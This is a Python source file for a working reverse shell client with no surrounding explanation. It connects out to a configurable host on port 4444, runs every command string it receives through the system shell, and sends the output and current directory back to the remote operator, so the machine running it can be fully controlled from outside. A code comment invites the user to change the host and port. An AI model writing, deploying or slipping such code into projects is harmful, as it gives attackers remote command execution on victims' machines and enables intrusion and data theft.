import os
import socket
import subprocess
import traceback
import sys


def connect(host="0.0.0.0", port=4444): #If you need to change the host IP or port, do it here.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        try:
            data = s.recv(10240)
            if data.decode("utf-8") == "quit":
                s.close()
                sys.exit(0)
                break
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode(
                    "utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd. stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        except KeyboardInterrupt:
            print("\nShutdown Requested")
            s.close()
            break
        except Exception:
            traceback.print_exc(file=sys.stdout)
            sys.exit(0)
            break


if __name__ == '__main__':
    connect()
